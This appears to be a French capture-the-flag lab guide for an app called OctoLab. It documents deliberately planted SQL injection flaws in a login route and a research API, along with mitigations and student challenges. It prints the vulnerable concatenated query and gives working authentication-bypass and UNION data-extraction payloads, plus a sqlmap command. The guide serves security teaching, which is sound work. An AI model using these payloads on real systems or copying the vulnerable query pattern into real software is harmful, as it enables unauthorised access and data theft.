# ğŸš¨ Guide des VulnÃ©rabilitÃ©s - OctoLab CTF

> **âš ï¸ ATTENTION**: Ce document est destinÃ© uniquement Ã  des fins Ã©ducatives dans le cadre d'un exercice de cybersÃ©curitÃ© contrÃ´lÃ©.

## ğŸ¯ Objectif de l'exercice

Ce laboratoire contient des vulnÃ©rabilitÃ©s intentionnelles pour permettre aux Ã©tudiants d'apprendre les techniques d'exploitation et de sÃ©curisation des applications web.

## ğŸ”“ VulnÃ©rabilitÃ© 1: SQL Injection dans l'authentification

### ğŸ“ Localisation
- **Endpoint**: `POST /api/auth/login`
- **Fichier**: `backend/routes/auth.js`
- **Type**: SQL Injection classique

### ğŸ” Description de la faille

La route de login utilise une concatÃ©nation directe des paramÃ¨tres dans la requÃªte SQL :

```javascript
const vulnerableQuery = `SELECT * FROM users WHERE email = '${email}' AND password = '${password}'`;
```

Cette approche permet d'injecter du code SQL malveillant dans les paramÃ¨tres `email` ou `password`.

### ğŸ¯ Techniques d'exploitation

#### 1. Bypass d'authentification simple

**Payload dans le champ email** :
```
admin@octolab.org' OR '1'='1' --
```

**Payload dans le champ password** :
```
' OR '1'='1' --
```

#### 2. Bypass avec commentaire SQL

**Email** :
```
' OR 1=1 /*
```

**Password** :
```
N'importe quoi
```

#### 3. Union-based injection (extraction de donnÃ©es)

**Email** :
```
' UNION SELECT id, name, email, password, clearance_level FROM users --
```

#### 4. Extraction de la structure de la base

**Email** :
```
' UNION SELECT name, sql, '', '', '' FROM sqlite_master WHERE type='table' --
```

### ğŸ§ª Tests pratiques

#### Test 1: Bypass simple
1. Aller sur la page de login : http://localhost:5173/login
2. Email : `admin@octolab.org' OR '1'='1' --`
3. Password : `anything`
4. Observer la connexion rÃ©ussie

#### Test 2: Extraction d'utilisateurs
1. Utiliser Burp Suite ou un outil similaire
2. Intercepter la requÃªte POST vers `/api/auth/login`
3. Modifier le payload pour extraire tous les utilisateurs

#### Test 3: Analyse des logs
1. Observer les logs du serveur backend
2. Voir la requÃªte SQL vulnÃ©rable s'afficher avec `ğŸš¨ REQUÃŠTE VULNÃ‰RABLE EXÃ‰CUTÃ‰E:`

### ğŸ›¡ï¸ Comparaison avec la version sÃ©curisÃ©e

Une route sÃ©curisÃ©e est disponible Ã  `/api/auth/login-secure` qui utilise :
- ParamÃ¨tres liÃ©s (prepared statements)
- Hachage bcrypt pour les mots de passe
- Validation appropriÃ©e des entrÃ©es

## ğŸ”“ VulnÃ©rabilitÃ© 2: SQL Injection dans l'API de recherche

### ğŸ“ Localisation
- **Endpoint**: `GET /api/research?id=X`
- **Fichier**: `backend/routes/api.js`
- **Type**: SQL Injection dans les paramÃ¨tres GET

### ğŸ¯ Techniques d'exploitation

#### 1. Extraction de donnÃ©es
```
http://localhost:3001/api/research?id=1' UNION SELECT id, title, description, classification FROM research_projects --
```

#### 2. Extraction de tous les utilisateurs
```
http://localhost:3001/api/research?id=1' UNION SELECT id, name, email, clearance_level FROM users --
```

## ğŸ› ï¸ Outils recommandÃ©s

### Pour les tests manuels
- **Burp Suite Community** : Interception et modification des requÃªtes
- **OWASP ZAP** : Scanner de vulnÃ©rabilitÃ©s
- **Postman** : Tests d'API
- **Browser DevTools** : Analyse des requÃªtes rÃ©seau

### Pour les tests automatisÃ©s
- **SQLMap** : Outil d'exploitation SQL injection
```bash
sqlmap -u "http://localhost:3001/api/research?id=1" --dbs
```

## ğŸ“š Ressources d'apprentissage

### Documentation OWASP
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)

### Laboratoires en ligne
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [DVWA (Damn Vulnerable Web Application)](http://www.dvwa.co.uk/)

## ğŸ”’ Techniques de mitigation

### 1. ParamÃ¨tres liÃ©s (Prepared Statements)
```javascript
// âŒ VulnÃ©rable
const query = `SELECT * FROM users WHERE email = '${email}'`;

// âœ… SÃ©curisÃ©
db.get('SELECT * FROM users WHERE email = ?', [email], callback);
```

### 2. Validation des entrÃ©es
```javascript
// Validation de l'email
const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
if (!emailRegex.test(email)) {
  return res.status(400).json({ error: 'Format email invalide' });
}
```

### 3. Ã‰chappement des caractÃ¨res spÃ©ciaux
```javascript
const sanitizedInput = input.replace(/['"\\]/g, '\\$&');
```

### 4. Principe du moindre privilÃ¨ge
- Utiliser un compte de base de donnÃ©es avec des permissions limitÃ©es
- Ã‰viter les comptes administrateurs pour les applications

## ğŸ† DÃ©fis pour les Ã©tudiants

### Niveau DÃ©butant
1. RÃ©ussir Ã  se connecter sans connaÃ®tre de mot de passe valide
2. Extraire la liste de tous les utilisateurs
3. DÃ©couvrir la structure de la base de donnÃ©es

### Niveau IntermÃ©diaire
4. Extraire les mots de passe hachÃ©s
5. Identifier les diffÃ©rents niveaux de clearance
6. Exploiter la vulnÃ©rabilitÃ© dans l'API de recherche

### Niveau AvancÃ©
7. Automatiser l'exploitation avec SQLMap
8. Proposer un correctif sÃ©curisÃ©
9. ImplÃ©menter des tests de sÃ©curitÃ© automatisÃ©s

## ğŸ“ Rapport d'exploitation

Les Ã©tudiants doivent documenter :
1. **DÃ©couverte** : Comment la vulnÃ©rabilitÃ© a Ã©tÃ© identifiÃ©e
2. **Exploitation** : Payloads utilisÃ©s et rÃ©sultats obtenus
3. **Impact** : DonnÃ©es sensibles accessibles
4. **Recommandations** : Solutions de sÃ©curisation proposÃ©es
5. **Preuve de concept** : Screenshots et logs

---

**âš ï¸ Rappel important** : Ces vulnÃ©rabilitÃ©s sont intentionnelles et ne doivent Ãªtre exploitÃ©es que dans le cadre de cet exercice Ã©ducatif. L'utilisation de ces techniques sur des systÃ¨mes non autorisÃ©s est illÃ©gale.